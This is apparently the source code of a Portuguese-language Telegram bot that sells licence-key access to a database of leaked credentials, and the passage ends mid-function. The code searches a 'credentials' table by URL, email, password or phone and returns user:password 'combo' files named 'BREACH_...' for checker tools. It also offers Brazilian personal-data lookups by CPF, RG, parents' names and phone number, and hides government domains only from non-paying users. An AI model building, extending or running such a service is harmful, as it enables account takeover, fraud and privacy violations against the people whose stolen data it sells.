import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';
dotenv.config();

// Fix: sem isso, enviar Buffer de texto causa "Unsupported Buffer file-type"
process.env.NTBA_FIX_350 = '1';

import fs from 'fs';
import path from 'path';
import os from 'os';
import https from 'https';
import http from 'http';
import { fileURLToPath } from 'url';
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const archiver = require('archiver');
import zlib from 'zlib';
import Stripe from 'stripe';
import { processReplyMarkup } from './emoji-helpers.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const TOKEN = process.env.TELEGRAM_TOKEN;
const BANNER_JPG = path.join(__dirname, 'assets', 'banner.jpg');
const BANNER_PNG = path.join(__dirname, 'assets', 'banner.png');
const BANNER_VIDEO = path.join(__dirname, 'assets', 'banner.mp4');
const BANNER_PATH = BANNER_JPG; // Para compatibilidade com código existente

// Usa tmpdir do sistema (funciona no Windows e Linux)
const TMP_DIR = os.tmpdir();

// Bot será criado dentro do setupBot() para evitar dupla polling
let bot = null;
// Pool de escrita para license_keys e bot_trials (configurado no setupBot)
let _writePool = null;
let _publicPool = null;

// ═══ CACHE EM MEMÓRIA PARA DADOS FREQUENTES ═══
const userAccessCache = new Map(); // { userId: { status, data, cachedAt } }
const CACHE_TTL = 60000; // 60 segundos
function getCachedAccess(userId) {
  const cached = userAccessCache.get(userId);
  if (cached && Date.now() - cached.cachedAt < CACHE_TTL) return cached.data;
  return null;
}
function setCachedAccess(userId, data) {
  userAccessCache.set(userId, { data, cachedAt: Date.now() });
}


// ══════════════════════════════════════════════════
// SISTEMA DE LICENÇA / TRIAL — CONFIGURAÇÃO
// ══════════════════════════════════════════════════
const OWNER_PROFILE = process.env.ADMIN_PROFILE_URL || 'https://t.me/controletotal';
const ADMIN_ID = process.env.TELEGRAM_CHAT_ID ? parseInt(process.env.TELEGRAM_CHAT_ID) : 8694124825; // Telegram ID do admin (@controletotal)
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID ? parseInt(process.env.TELEGRAM_CHAT_ID) : ADMIN_ID; // Chat para notificações do Portal SISP
let maintenanceMode = false; // Modo manutenção global
const TRIAL_MAX_SEARCHES = 999999;
const TRIAL_MAX_RESULTS = 100;
const GROUP_MAX_RESULTS = 50;
const PREMIUM_MAX_ROWS = 100000;

// Grupos permitidos com acesso "group" (consulta infinita, 100 resultados, sem mensagens de key)
// Adicione o ID do grupo aqui. O ID é um número negativo (ex: -1001234567890).
// Para descobrir, adicione o bot ao grupo e veja no log: [GROUP] chatId=...
const ALLOWED_GROUPS = new Set([
  process.env.ASSEMBLY_GROUP_ID ? String(process.env.ASSEMBLY_GROUP_ID) : null,
  '-1003518534631', // @assemblyleak (ASSEMBLY LEAK)
].filter(Boolean));

function isAllowedGroup(chatId) {
  if (!chatId) return false;
  return ALLOWED_GROUPS.has(String(chatId));
}

// Verifica se o usuário que mandou msg em grupo é o dono (criador) do grupo
async function isGroupOwner(msg) {
  if (!msg || !msg.chat || !msg.from) return false;
  const chatType = msg.chat.type;
  if (chatType !== 'group' && chatType !== 'supergroup') return false;
  // Se for grupo permitido, qualquer membro vale
  if (isAllowedGroup(msg.chat.id)) return true;
  try {
    const member = await bot.getChatMember(msg.chat.id, msg.from.id);
    return member && (member.status === 'creator' || member.status === 'administrator');
  } catch (e) {
    return false;
  }
}

// ── Stripe ──
const stripeKey = process.env.STRIPE_SECRET_KEY;
let stripe = null;
if (stripeKey && stripeKey !== 'sua_chave_secreta_stripe') {
  stripe = new Stripe(stripeKey);
}

// Planos: [label, dias, preço em centavos]
const PLANS = [
  { label: '1 Dia', days: 1,  priceCents: 1000,  emoji: '⚡' },
  { label: '50 Dias', days: 50, priceCents: 5000,  emoji: '🔥' },
  { label: '30 Dias', days: 30, priceCents: 10000, emoji: '💎' },
];

async function getMaxRows(chatId) {
  const inGroup = groupChats.has(chatId);
  const a = await checkUserAccess(chatId, inGroup);
  if (a.status === 'premium') return PREMIUM_MAX_ROWS;
  if (a.status === 'group') return GROUP_MAX_RESULTS;
  return 100;
}

// ══════════════════════════════════════════════════
// FUNÇÕES DE LICENÇA / TRIAL
// ══════════════════════════════════════════════════

/**
 * Verifica o status de acesso do usuário
 * Retorna: { status: 'premium' | 'trial' | 'expired' | 'new', searchesLeft: number }
 */
async function checkUserAccess(telegramId, isGroupOwnerFlag = false) {
  try {
    // 0. Se for dono/admin de grupo → modo grupo (ilimitado, 100 resultados)
    if (isGroupOwnerFlag) {
      return { status: 'group', searchesLeft: Infinity };
    }

    // CACHE: verifica se tem na memória (válido por 60s)
    const cached = getCachedAccess(telegramId);
    if (cached) return cached;

    // 1. Verifica se tem license key ativa (não expirada)
    const keyRes = await _writePool.query(
      `SELECT id, expires_at FROM license_keys WHERE telegram_id = $1 AND activated_at IS NOT NULL LIMIT 1`,
      [telegramId]
    );
    if (keyRes.rows.length > 0) {
      const expiresAt = keyRes.rows[0].expires_at;
      // Se tem expires_at e já passou, a key expirou
      if (expiresAt && new Date(expiresAt) < new Date()) {
        // Key expirada — cai no trial abaixo
      } else {
        const result = { status: 'premium', searchesLeft: Infinity, expiresAt };
        setCachedAccess(telegramId, result);
        return result;
      }
    }

    // 2. Verifica trial — reseta a cada 6 horas
    const trialRes = await _writePool.query(
      `SELECT searches, last_reset FROM bot_trials WHERE telegram_id = $1 LIMIT 1`,
      [telegramId]
    );
    if (trialRes.rows.length === 0) {
      const result = { status: 'new', searchesLeft: TRIAL_MAX_SEARCHES };
      setCachedAccess(telegramId, result);
      return result;
    }

    let searches = trialRes.rows[0].searches;
    const lastReset = trialRes.rows[0].last_reset;

    // Reseta a cada 6 horas
    if (lastReset) {
      const hoursSinceReset = (Date.now() - new Date(lastReset).getTime()) / (1000 * 60 * 60);
      if (hoursSinceReset >= 6) {
        await _writePool.query(
          `UPDATE bot_trials SET searches = 0, last_reset = NOW() WHERE telegram_id = $1`,
          [telegramId]
        );
        searches = 0;
      }
    }

    if (searches >= TRIAL_MAX_SEARCHES) {
      // Calcula tempo restante para resetar
      const resetTime = new Date(lastReset);
      resetTime.setHours(resetTime.getHours() + 6);
      const minsLeft = Math.max(0, Math.ceil((resetTime - new Date()) / (1000 * 60)));
      const hours = Math.floor(minsLeft / 60);
      const mins = minsLeft % 60;
      const resetText = hours > 0 ? `${hours}h ${mins}min` : `${mins}min`;
      const result = { status: 'expired', searchesLeft: 0, resetIn: resetText };
      setCachedAccess(telegramId, result);
      return result;
    }

    const result = { status: 'trial', searchesLeft: TRIAL_MAX_SEARCHES - searches };
    setCachedAccess(telegramId, result);
    return result;
  } catch (err) {
    console.error('[ACCESS CHECK ERROR]', err.message);
    // Em caso de erro no banco, bloqueia para evitar loop infinito
    return { status: 'expired', searchesLeft: 0, resetIn: '10min' };
  }
}

/**
 * Registra o usuário como trial (se ainda não existir)
 */
async function registerTrial(telegramId) {
  try {
    await _writePool.query(
      `INSERT INTO bot_trials (telegram_id, searches, last_reset) VALUES ($1, 0, NOW()) ON CONFLICT (telegram_id) DO NOTHING`,
      [telegramId]
    );
    return true;
  } catch (err) {
    console.error('[REGISTER TRIAL ERROR]', err.message);
    return false;
  }
}

/**
 * Incrementa o contador de pesquisas do trial
 */
async function incrementTrialSearch(telegramId) {
  try {
    await _writePool.query(
      `UPDATE bot_trials SET searches = searches + 1 WHERE telegram_id = $1`,
      [telegramId]
    );
  } catch (err) {
    console.error('[INCREMENT TRIAL ERROR]', err.message);
  }
}

/**
 * Ativa uma license key para o usuário
 * Retorna: { success: boolean, message: string }
 */
async function activateKey(telegramId, key) {
  try {
    // Verifica se a key existe e não está ativada
    const res = await _writePool.query(
      `SELECT id, telegram_id, expires_days, duration_seconds FROM license_keys WHERE key = $1 LIMIT 1`,
      [key.trim().toUpperCase()]
    );
    if (res.rows.length === 0) {
      return { success: false, message: '❌ *Key Inválida*\n\nVerifique e tente novamente.' };
    }
    if (res.rows[0].telegram_id) {
      return { success: false, message: '❌ *Key Já Utilizada*\n\nEsta key já foi ativada por outro usuário.' };
    }

    // Calcula duração total em segundos (prioriza duration_seconds; fallback para expires_days * 86400)
    const durSec = res.rows[0].duration_seconds != null
      ? Number(res.rows[0].duration_seconds)
      : (res.rows[0].expires_days ? Number(res.rows[0].expires_days) * 86400 : null);

    // Ativa a key com ou sem expiração
    if (durSec && durSec > 0) {
      await _writePool.query(
        `UPDATE license_keys SET telegram_id = $1, activated_at = now(), expires_at = now() + ($2::bigint || ' seconds')::INTERVAL WHERE key = $3`,
        [telegramId, durSec, key.trim().toUpperCase()]
      );
      const label = formatDuration(durSec);
      return { success: true, message: `✅ *Key Ativada!*\n\n⏳ Válida por *${label}*\nAproveite o acesso premium!` };
    } else {
      await _writePool.query(
        `UPDATE license_keys SET telegram_id = $1, activated_at = now() WHERE key = $2`,
        [telegramId, key.trim().toUpperCase()]
      );

      return { success: true, message: '✅ *Key Vitalícia Ativada!*\n\nAcesso completo ilimitado para sempre!' };
    }
  } catch (err) {
    console.error('[ACTIVATE KEY ERROR]', err.message);
    return { success: false, message: `❌ Erro interno: ${err.message}` };
  }
}

/**
 * Formata segundos em uma label legível (ex: "2 horas", "45 minutos")
 */
function formatDuration(totalSeconds) {
  totalSeconds = Math.floor(totalSeconds);
  if (totalSeconds < 60) return `${totalSeconds} segundo${totalSeconds === 1 ? '' : 's'}`;
  if (totalSeconds < 3600) {
    const m = Math.floor(totalSeconds / 60);
    return `${m} minuto${m === 1 ? '' : 's'}`;
  }
  if (totalSeconds < 86400) {
    const h = Math.floor(totalSeconds / 3600);
    return `${h} hora${h === 1 ? '' : 's'}`;
  }
  if (totalSeconds < 604800) {
    const d = Math.floor(totalSeconds / 86400);
    return `${d} dia${d === 1 ? '' : 's'}`;
  }
  const w = Math.floor(totalSeconds / 604800);
  return `${w} semana${w === 1 ? '' : 's'}`;
}

/**
 * Faz parse de uma string de duração: "30" (dias), "12h" (horas), "30m" (min), "45s" (seg)
 * Retorna { seconds, label } ou null se inválido
 */
function parseDuration(input) {
  if (!input) return null;
  const s = String(input).trim().toLowerCase();
  if (!s) return null;
  const m = s.match(/^(\d+(?:\.\d+)?)\s*([smhdw])?$/);
  if (!m) return null;
  const num = parseFloat(m[1]);
  if (!isFinite(num) || num <= 0) return null;
  const unit = m[2] || 'd';
  const mult = { s: 1, m: 60, h: 3600, d: 86400, w: 604800 }[unit];
  const seconds = Math.floor(num * mult);
  let label;
  if (unit === 's') label = `${Math.floor(num)} segundo${num === 1 ? '' : 's'}`;
  else if (unit === 'm') label = `${Math.floor(num)} minuto${num === 1 ? '' : 's'}`;
  else if (unit === 'h') label = `${Math.floor(num)} hora${num === 1 ? '' : 's'}`;
  else if (unit === 'd') label = `${Math.floor(num)} dia${num === 1 ? '' : 's'}`;
  else if (unit === 'w') label = `${Math.floor(num)} semana${num === 1 ? '' : 's'}`;
  return { seconds, label };
}

/**
 * Gera uma key aleatória no formato ASLK-XXXX-XXXX-XXXX
 * @param {number|null} durationSeconds - Segundos de validade (null = vitalícia)
 */
function generateKey(durationSeconds = null) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  const segment = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
  return { key: `ASLK-${segment()}-${segment()}-${segment()}`, durationSeconds };
}

/**
 * Mensagem de trial expirado / bloqueio
 */
function getExpiredMessage() {
  return `🚫 *Seu teste gratuito acabou!*\n\n` +
    `Você usou suas *${TRIAL_MAX_SEARCHES} pesquisas* gratuitas.\n\n` +
    `🔑 Para acesso *ILIMITADO* com senhas reais e sem limite de resultados:\n\n` +
    `💬 *Entre em contato:* ${OWNER_PROFILE}\n\n` +
    `_Já tem uma key? Use_ \`/key SUA-CHAVE\``;
}

// ══════════════════════════════════════════════════
// DETECÇÃO INTELIGENTE DE TIPO DE QUERY
// ══════════════════════════════════════════════════
function detectQueryType(query) {
  const q = query.trim();

  // E-mail: contém @
  if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(q)) return 'email';

  // Telefone: só números (com ou sem +, espaços, traços)
  if (/^[\+\d\s\-\(\)]{7,20}$/.test(q) && /\d{7,}/.test(q)) return 'TELEFONE';

  // URL / domínio: contém ponto e parece domínio
  if (/^(https?:\/\/|www\.)/i.test(q)) return 'url';
  if (/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(\/.*)?$/.test(q) && !q.includes('@')) return 'url';

  // Padrão: busca inteligente em todos os campos
  return 'smart';
}

// ══════════════════════════════════════════════════
// FORMATA UM REGISTRO
// ══════════════════════════════════════════════════
function formatRow(row) {
  let url = row.url || '';
  let email = row.email || '';
  let senha = row.senha || '';
  let telefone = row.telefone || '';

  // Extrai o usuário embutido na URL se houver separador (ignorando portas)
  // O usuário extraído da URL é o login específico e deve ter preferência (sobrescrevendo o email geral)
  if (url) {
    let lastSep = -1;
    for (let i = url.length - 1; i >= 0; i--) {
      const c = url.charCodeAt(i);
      if (c === 58 || c === 59 || c === 124 || c === 44 || c === 9) {
        if (c === 58 && i > 0 && i < url.length - 2 && url.charCodeAt(i+1) === 47 && url.charCodeAt(i+2) === 47) continue;
        lastSep = i; break;
      }
    }
    if (lastSep !== -1) {
      const extracted = url.substring(lastSep + 1);
      const isPort = /^\d+$/.test(extracted) && parseInt(extracted) <= 65535;
      if (!isPort) {
        email = extracted; // Sobrescreve o email geral para manter apenas o usuário original correto daquele site
        url = url.substring(0, lastSep);
      }
    }
  }

  let lines = `========================================\n`;
  if (email)    lines += `📧 USER: ${email}\n`;
  if (senha)    lines += `🔑 PASS: ${senha}\n`;
  if (url)      lines += `🌐 URL:  ${url}\n`;
  if (telefone) lines += `📱 TEL:  ${telefone}\n`;
  lines += `========================================\n`;
  return lines;
}

// Para o checker / exportações:
function formatRowChk(row) {
  let url = row.url || '';
  let email = row.email || '';

  if (url) {
    let lastSep = -1;
    for (let i = url.length - 1; i >= 0; i--) {
      const c = url.charCodeAt(i);
      if (c === 58 || c === 59 || c === 124 || c === 44 || c === 9) {
        if (c === 58 && i > 0 && i < url.length - 2 && url.charCodeAt(i+1) === 47 && url.charCodeAt(i+2) === 47) continue;
        lastSep = i; break;
      }
    }
    if (lastSep !== -1) {
      const extracted = url.substring(lastSep + 1);
      const isPort = /^\d+$/.test(extracted) && parseInt(extracted) <= 65535;
      if (!isPort) {
        email = extracted;
      }
    }
  }

  const e = email || url || row.telefone || '';
  return `${e}:${row.senha || ''}`;
}

function formatRowChk2(row) {
  let url = row.url || '';
  let email = row.email || '';

  if (url) {
    let lastSep = -1;
    for (let i = url.length - 1; i >= 0; i--) {
      const c = url.charCodeAt(i);
      if (c === 58 || c === 59 || c === 124 || c === 44 || c === 9) {
        if (c === 58 && i > 0 && i < url.length - 2 && url.charCodeAt(i+1) === 47 && url.charCodeAt(i+2) === 47) continue;
        lastSep = i; break;
      }
    }
    if (lastSep !== -1) {
      const extracted = url.substring(lastSep + 1);
      const isPort = /^\d+$/.test(extracted) && parseInt(extracted) <= 65535;
      if (!isPort) {
        email = extracted;
        url = url.substring(0, lastSep);
      }
    }
  }

  return `${url}:${email}:${row.senha || ''}`;
}

// Helper para verificar se um registro possui tanto usuário quanto senha válidos
function hasUserAndPass(row) {
  let url = row.url || '';
  let email = row.email || '';
  let senha = row.senha || '';

  if (url) {
    let lastSep = -1;
    for (let i = url.length - 1; i >= 0; i--) {
      const c = url.charCodeAt(i);
      if (c === 58 || c === 59 || c === 124 || c === 44 || c === 9) {
        if (c === 58 && i > 0 && i < url.length - 2 && url.charCodeAt(i+1) === 47 && url.charCodeAt(i+2) === 47) continue;
        lastSep = i; break;
      }
    }
    if (lastSep !== -1) {
      const extracted = url.substring(lastSep + 1);
      const isPort = /^\d+$/.test(extracted) && parseInt(extracted) <= 65535;
      if (!isPort) {
        email = extracted;
      }
    }
  }

  const emailClean = (email || '').trim();
  const senhaClean = (senha || '').trim();

  return emailClean.length > 0 && senhaClean.length > 0;
}

// Lista de domínios governamentais bloqueados para usuários free
const GOV_BLOCK_RE = /(?:^|[.\/])(gov(?:\.br)?|gov|saude|policia|justica|defesa|exercito|marinha|aeronautica|camara|senado|prefeitura|governo|ministerio|militar|receita|fazenda|tribunal|defensoria|transparencia|educacao|mec|inss|caixa|bndes|petrobras|correios|ibama|icmbio|incra|ana|antt|anatel|anac|anp|aneel|anvisa|ans|sus|mpf|mpt|mpm|stf|stj|tst|tse|stm|simpi|dataprev|serpro|conectividade|tcu)/i;

// Função para validar, limpar e remover duplicatas dos resultados com base no formato de saída
async function getUniqueValidRows(rows, format, chatId) {
  const seen = new Set();
  const result = [];

  let isPremium = false;
  if (chatId) {
    const inGroup = groupChats.has(chatId);
    const access = await checkUserAccess(chatId, inGroup);
    isPremium = access.status === 'premium';
  }

  for (const row of rows) {
    let url = row.url || '';
    let email = row.email || '';
    let senha = row.senha || '';
    let telefone = row.telefone || '';

    // Filtra sites .gov.br (só para não-admin)
    if (chatId !== ADMIN_ID && url && /\.gov\.br/i.test(url)) continue;
    if (chatId !== ADMIN_ID && email && /\.gov\.br/i.test(email)) continue;

    if (url) {
      let lastSep = -1;
      for (let i = url.length - 1; i >= 0; i--) {
        const c = url.charCodeAt(i);
        if (c === 58 || c === 59 || c === 124 || c === 44 || c === 9) {
          if (c === 58 && i > 0 && i < url.length - 2 && url.charCodeAt(i+1) === 47 && url.charCodeAt(i+2) === 47) continue;
          lastSep = i; break;
        }
      }
      if (lastSep !== -1) {
        const extracted = url.substring(lastSep + 1);
        const isPort = /^\d+$/.test(extracted) && parseInt(extracted) <= 65535;
        if (!isPort) {
          email = extracted;
          url = url.substring(0, lastSep);
        }
      }
    }

    const emailClean = email.trim();
    const senhaClean = senha.trim();

    if (!emailClean || !senhaClean) continue;

    // Filtrar conteúdo promocional do Telegram
    const allFields = `${url} ${email} ${senha} ${telefone}`;
    if (/t\.me\/|https?:\/\/t\.me|join\.me|t\.ly\/|bit\.ly\/|tele\.me\//i.test(allFields)) continue;

    // Bloquear domínios governamentais para usuários free
    if (!isPremium && url && GOV_BLOCK_RE.test(url)) continue;

    let key;
    if (format === 'chk') {
      key = `${emailClean}:${senhaClean}`;
    } else if (format === 'chk2') {
      key = `${url.trim()}:${emailClean}:${senhaClean}`;
    } else {
      key = `${url.trim()}|${emailClean}|${senhaClean}|${telefone.trim()}`;
    }

    if (!seen.has(key)) {
      seen.add(key);
      result.push({
        url: url.trim(),
        email: emailClean,
        senha: senhaClean,
        telefone: telefone.trim(),
        id: row.id,
        numero: row.numero,
        fonte: row.fonte
      });
    }
  }
  
  return result;
}

// Store para guardar queries pendentes (botões inline)
const queryStore = new Map();
const pendingBoleto = new Map(); // chatId -> { planIdx, plan }
const pendingSearch = new Map(); // `${chatId}_${userId}` -> fieldName
const pendingConsulta = new Map(); // `${chatId}_${userId}` -> apiKey

// ── Nossa própria API de consulta (cache local no Railway) ──
const BASE_URL = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3001}`;
const CONSULTA_APIS = {
  cpf:     { name: '🔢 CPF',                 url: `${BASE_URL}/api/consulta/`,              param: 'cpf', local: true },
  nome:    { name: '👤 Nome',                 url: `${BASE_URL}/api/consulta/busca/nome?q=`, param: 'q' },
  rg:      { name: '🆔 RG',                   url: `${BASE_URL}/api/consulta/busca/rg?q=`,   param: 'q' },
  mae:     { name: '👩 Nome da Mãe',         url: `${BASE_URL}/api/consulta/busca/mae?q=`,  param: 'q' },
  pai:     { name: '👨 Nome do Pai',         url: `${BASE_URL}/api/consulta/busca/pai?q=`,  param: 'pai' },
  cbo:     { name: '💼 Profissão (CBO)',     url: `${BASE_URL}/api/consulta/busca/cbo?q=`,  param: 'cbo' },
  sit_cpf: { name: '✅ Situação CPF',         url: `${BASE_URL}/api/consulta/`,              param: 'cpf', local: true },
  tel:     { name: '📞 Telefone',             url: `${BASE_URL}/api/consulta/busca/tel?q=`,  param: 'TELEFONE' },
};

const CONSULTA_CACHE_PATH = path.join(TMP_DIR, 'consulta_cache.json');
let consultaCache = {};
try { consultaCache = JSON.parse(fs.readFileSync(CONSULTA_CACHE_PATH, 'utf8')); } catch (_) {}
function saveConsultaCache() {
  try { fs.writeFileSync(CONSULTA_CACHE_PATH, JSON.stringify(consultaCache), 'utf8'); } catch (_) {}
}

const newSearchBtn = { inline_keyboard: [[{ text: '🔍 NOVA BUSCA', callback_data: 'search_menu', style: 'primary' }], [{ text: '🏠 MENU PRINCIPAL', callback_data: 'back_start', style: 'primary' }], [{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] };
const noResultBtn = { inline_keyboard: [[{ text: '🔍 NOVA BUSCA', callback_data: 'search_menu', style: 'primary' }], [{ text: '🏠 MENU PRINCIPAL', callback_data: 'back_start', style: 'primary' }]] };
const cancelSearchBtn = { inline_keyboard: [[{ text: '🔴 CANCELAR BUSCA', callback_data: 'cancel_search', style: 'primary' }]] };
const novaBtn = { inline_keyboard: [[{ text: '🔍 FAZER OUTRA', callback_data: 'fazer_outra', style: 'primary' }], [{ text: '🏠 MENU PRINCIPAL', callback_data: 'back_start', style: 'primary' }], [{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] };
const runningSearches = new Map(); // chatId -> { cancelled: boolean }
const groupChats = new Set(); // chatId de grupos onde o bot já validou o owner
const groupChatsLogged = new Set(); // chatId já logado (evita spam no console)
const groupOwners = new Map(); // chatId -> userId do owner/admin
// Set para controlar stop do checker
const checkerStopSet = new Set();


// ══════════════════════════════════════════════════
// FORMATA RESULTADOS COM LIMITE DE TRIAL
// ══════════════════════════════════════════════════
async function formatRowsWithLimit(rows, format, chatId) {
  const inGroup = groupChats.has(chatId);
  const access = await checkUserAccess(chatId, inGroup);
  const isPremium = access.status === 'premium';
  const isGroup = access.status === 'group';
  const formatter = format === 'chk' ? formatRowChk : format === 'chk2' ? formatRowChk2 : formatRow;
  const limit = isPremium ? rows.length : (isGroup ? GROUP_MAX_RESULTS : TRIAL_MAX_RESULTS);
  const limited = rows.slice(0, limit);
  const content = limited.map(formatter).join('\n');
  return { content, count: limited.length, total: rows.length, limited: rows.length > limit };
}

// ══════════════════════════════════════════════════
// BUSCA POR CAMPO ESPECÍFICO (url, email, senha, telefone)
// ══════════════════════════════════════════════════
async function sendResults(chatId, field, query, pool, threadId, format = 'full') {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;

  // DB5 (último pool) é admin-only
  if (_publicPool && chatId !== ADMIN_ID) pool = _publicPool;

  if (!query || query.trim().length < 2) {
    return bot.sendMessage(chatId, `❌ Uso: \`/${field} <valor>\``, opts({ parse_mode: 'Markdown' }));
  }

  const q = query.trim();
  const fieldEmoji = { url: '🌐', email: '📧', senha: '🔑', telefone: '📱' }[field] || '🔍';
  const doPartial = q.length >= 6;

  let loadingMsg;
  try {
    bot.sendChatAction(chatId, 'upload_document', opts()).catch(() => {});
    runningSearches.set(chatId, { cancelled: false });
    loadingMsg = await bot.sendMessage(
      chatId,
      `${fieldEmoji} *Buscando ${field}:* \`${q}\`\n⏳ _Aguarde, consultando banco..._`,
      opts({ parse_mode: 'Markdown', reply_markup: cancelSearchBtn })
    );
  } catch (e) {}

    const MAX_ROWS = await getMaxRows(chatId);
  try {
    const t0 = Date.now();
    // Verifica cancelamento antes de iniciar
    if (runningSearches.get(chatId)?.cancelled) {
      runningSearches.delete(chatId);
      if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      return;
    }
    let rows = [];

    if (field === 'url') {
      // ── URL: busca por prefixo combinada (1 query ao invés de 4) ──
      const domain = q.replace(/^https?:\/\//i, '').replace(/^www\./i, '');

      const res = await pool.query(
        `SELECT * FROM credentials WHERE url LIKE $1 OR url LIKE $2 OR url LIKE $3 OR url LIKE $4 OR url LIKE $5 LIMIT $6`,
        [`http://${domain}%`, `https://${domain}%`, `http://www.${domain}%`, `https://www.${domain}%`, `${domain}%`, MAX_ROWS]
      );
      rows = res.rows;

      // Deduplica e limita (necessário pq multi-db pode retornar dupes)
      if (rows.length > MAX_ROWS) {
        const seen = new Set();
        const deduped = [];
        for (const row of rows) {
          const key = row.id ?? `${row.url}|${row.email}|${row.senha}`;
          if (!seen.has(key)) { seen.add(key); deduped.push(row); }
          if (deduped.length >= MAX_ROWS) break;
        }
        rows = deduped;
      }

    } else if (field === 'TELEFONE') {
      // ── telefone: busca inteligente em múltiplos campos e formatos ──
      const digits = q.replace(/[^\d]/g, '');
      const formatted = digits.length === 11
        ? `(${digits.slice(0,2)}) ${digits.slice(2,7)}-${digits.slice(7,11)}`
        : digits.length === 10
        ? `(${digits.slice(0,2)}) ${digits.slice(2,6)}-${digits.slice(6,10)}`
        : null;

      const searches = [q];
      if (digits && !searches.includes(digits)) searches.push(digits);
      if (formatted && !searches.includes(formatted)) searches.push(formatted);
      if (digits.startsWith('55') && digits.length > 10) {
        const withoutDdi = digits.replace(/^55/, '');
        if (!searches.includes(withoutDdi)) searches.push(withoutDdi);
        const formattedWithoutDdi = withoutDdi.length === 11
          ? `(${withoutDdi.slice(0,2)}) ${withoutDdi.slice(2,7)}-${withoutDdi.slice(7,11)}`
          : withoutDdi.length === 10
          ? `(${withoutDdi.slice(0,2)}) ${withoutDdi.slice(2,6)}-${withoutDdi.slice(6,10)}`
          : null;
        if (formattedWithoutDdi && !searches.includes(formattedWithoutDdi)) searches.push(formattedWithoutDdi);
      }

      const tempRows = [];
      const seenKeys = new Set();
      
      for (const term of searches) {
        const res = await pool.query(
          `SELECT * FROM credentials WHERE telefone = $1 OR url = $1 OR email = $1 LIMIT $2`,
          [term, MAX_ROWS]
        );
        for (const row of res.rows) {
          const key = row.numero ?? `${row.url}|${row.email}|${row.senha}`;
          if (!seenKeys.has(key)) {
            seenKeys.add(key);
            tempRows.push(row);
          }
        }
      }

      if (tempRows.length === 0) {
        for (const term of searches) {
          if (term.length < 3) continue;
          const res = await pool.query(
            `SELECT * FROM (
              (SELECT * FROM credentials WHERE telefone ILIKE $1 LIMIT ${Math.ceil(MAX_ROWS/3)})
              UNION ALL
              (SELECT * FROM credentials WHERE url      ILIKE $1 LIMIT ${Math.ceil(MAX_ROWS/3)})
              UNION ALL
              (SELECT * FROM credentials WHERE email    ILIKE $1 LIMIT ${Math.ceil(MAX_ROWS/3)})
            ) AS combined LIMIT $2`,
            [`%${term}%`, MAX_ROWS]
          );
          for (const row of res.rows) {
            const key = row.numero ?? `${row.url}|${row.email}|${row.senha}`;
            if (!seenKeys.has(key)) {
              seenKeys.add(key);
              tempRows.push(row);
            }
          }
          if (tempRows.length >= MAX_ROWS) break;
        }
      }
      rows = tempRows.slice(0, MAX_ROWS);

    } else {
      // ── email / senha: exata → parcial ──
      let res = await pool.query(
        `SELECT * FROM credentials WHERE ${field} = $1 LIMIT $2`, [q, MAX_ROWS]
      );
      if (res.rows.length === 0 && doPartial) {
        res = await pool.query(
          `SELECT * FROM credentials WHERE ${field} ILIKE $1 LIMIT $2`, [`%${q}%`, MAX_ROWS]
        );
      }
      rows = res.rows;
    }

    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    if (rows.length === 0) {
      const hint = field === 'url'
        ? `\n\n💡 _Tente sem http:// ex: \`/url site.gov.br\`_`
        : !doPartial ? `\n\n💡 _Termo curto: só busca exata._` : '';
      return bot.sendMessage(chatId, `❌ Nenhum resultado para \`${q}\`${hint}`, opts({ parse_mode: 'Markdown', reply_markup: noResultBtn }));
    }

    const cleanedRows = await getUniqueValidRows(rows, format, chatId);
    if (cleanedRows.length === 0) {
      if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      if (cleanedRows.govBlocked) {
        return bot.sendMessage(chatId, `❌ Sites governamentais bloqueado no trial`, opts({ parse_mode: 'Markdown' }));
      }
      return bot.sendMessage(chatId, `❌ Nenhum resultado válido (com usuário e senha) encontrado para \`${q}\``, opts({ parse_mode: 'Markdown' }));
    }

    const { content, count, total, limited } = await formatRowsWithLimit(cleanedRows, format, chatId);
    const safeQuery = q.replace(/[^a-zA-Z0-9_\-]/g, '_').slice(0, 40);
    const formatTag = format === 'chk' ? 'CHK' : format === 'chk2' ? 'CHK2' : field.toUpperCase();
    const inGroup = groupChats.has(chatId);
    const limitNote = rows.length >= MAX_ROWS ? `\n⚠️ _Limite de ${MAX_ROWS.toLocaleString('pt-BR')} resultados atingido_` : '';
    const trialNote = limited ? `\n⚠️ _Modo teste: apenas ${count.toLocaleString('pt-BR')} resultados exibidos_` : '';
    const access = await checkUserAccess(chatId, inGroup);
    const isPremium = access.status === 'premium';
    const isGroup = access.status === 'group';
    const totalNote = (isPremium || isGroup) && total > count ? `\n📊 _Total de logins encontrados: ${total.toLocaleString('pt-BR')}_` : '';
    const formatLabel = format === 'chk' ? 'CHK' : field.toUpperCase();
    
    await bot.sendDocument(chatId, Buffer.from(content, 'utf8'), opts({
      caption: `✅ *${formatLabel}:* \`${q}\`\n📂 _${count.toLocaleString('pt-BR')} logins enviados_${limitNote}${trialNote}${totalNote}`,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename: `BREACH_${formatLabel}_${safeQuery}.txt`, contentType: 'text/plain' });

    runningSearches.delete(chatId);

  } catch (err) {
    console.error(`[BOT] sendResults error:`, err);
    runningSearches.delete(chatId);
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    let msg;
    if (err.message?.includes('timeout') || err.code === '57014') {
      msg = `⏱️ *Busca expirou!* Tente um termo mais específico.`;
    } else if (err.message?.includes('ETELEGRAM') || err.message?.includes('Request Entity Too Large')) {
      msg = `⚠️ Arquivo muito grande. Tente um termo mais específico.`;
    } else {
      msg = `❌ Erro: ${err.message}`;
